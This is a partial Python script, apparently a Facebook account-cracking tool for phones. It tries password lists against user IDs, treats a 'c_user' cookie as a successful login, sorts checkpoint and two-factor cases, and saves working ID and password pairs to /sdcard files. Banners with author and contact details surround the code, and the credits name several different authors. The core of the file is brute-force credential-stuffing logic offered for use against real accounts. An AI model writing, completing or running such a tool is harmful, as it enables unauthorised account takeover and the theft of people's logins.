...
#created by Farhad 
#team name hbf
#tottaly written by Ali Hashemi
#!/usr/bin/python3
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; Sami_Hassan \x07')
...
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟ \033[1;32m SAMI HASSAN     \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟ \033[1;32m Sta.samim33  \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟ \033[1;32m SamimHassan               \033[1;31m 
\033[1;31m│\033[1;37m☞  \033[1;32mWHATSAPP  \033[1;31m ➟  \033[1;32m0775268966              \033[1;31m   
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟  \033[1;32m1.2                         \033[1;31m   
\033[1;31m│\033[1;37m☞  \033[1;32mStatus\033[1;31m :    ➟ \033[1;32m 🅟︎🅡︎🅔︎🅜︎🅘︎🅤︎🅜︎  🅜︎🅞︎🅓︎🅔︎  🅐︎🅒︎🅣︎🅘︎🅥︎🅐︎🅣︎🅔︎🅓︎\033[1;37m {\033[1;36mFB\033[1;37m} \033[1;31m
...
def file_crack():
    ...
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/Sami_Hassan_OK.txt\n[•] CP IDS SAVE : /sdcard/Sami_Hassan_CP.txt')
...
def method1(ids,names,passlist,total_ids):
    ...
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[Sami_Hassan]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                print('\r\033[1;32m[Sami_Hassan-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('/sdcard/Sami_Hassan_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d):
                    print('\r\033[1;35m[Sami_Hassan-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('/sdcard/Sami_Hassan_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\r\033[1;31m[Sami_Hassan-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('/sdcard/Sami_Hassan_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
    except Exception as e:
...
def method2(ids,names,passlist,total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                print('\r\033[1;32m[Sami_Hassan-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/Sami_Hassan_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                ...
                if 'Enter login code to continue' in str(d.group(1)):
                    print('\r\033[1;35m[Sami_Hassan-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('/sdcard/Sami_Hassan_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\r\033[1;31m[Sami.Hassan-CP] '+ids+' | '+pas+'\033[0;97m')
                    cp.append(ids)
                    open('/sdcard/Sami_Hassan_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
...
def random_method(ids,passlist,total_ids):
    ...
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r{WHITE}[Sami_Hassan]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    os.system("play-audio Sami Hassan_OK.mp3")
                    print('\r\033[1;92m[Sami_Hassan-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/Sami_Hassan_OK.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[141:156]
                if cid in tf:
                    ...
                    d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                    if 'Enter login code to continue' in str(d.group(1)):
                        os.system("play-audio Sami Hassan_2F.mp3")
                        print('\r\033[1;95m[Sami_Hassan-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        open('/sdcard/Sami_Hassan_2F.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
                        else:
                            os.system("play-audio Sami Hassan_CP.mp3")
                            print('\r\033[1;94m[Sami_Hassan-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
                            open('/sdcard/Sami_Hassan_CP.txt', 'a').write(cid+' | '+pas+'\n')
                            break
            else:continue
         #   else:
               # print(ua_opera)
...
def file_m():
    ...
    for xid in lines:
        ...
        try:
            ...
            pass
    print("")
    print('\n Example: /sdcard/Sami_Hassan.txt ')
    print("")
...
def pass1():
    ...
    print(f'\n[~]{WHITE}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/Sami_Hassan-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Sami_Hassan-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r{GREEN}[SAMI_HASSAN-OK]  '+uid+' | '+ps+ '  ') 
                cek_apk(session,coki)
                open('/sdcard/SAMI_HASSAN-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/SAMI_HASSAN-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r{RED}[SAMI_HASSAN-CP] '+uid+' | '+ps+' ')
                    open('/sdcard/HASHEMI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[SAMI_HASSAN] [%s] \33[1;97m[OK:%s{HASHEMI}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
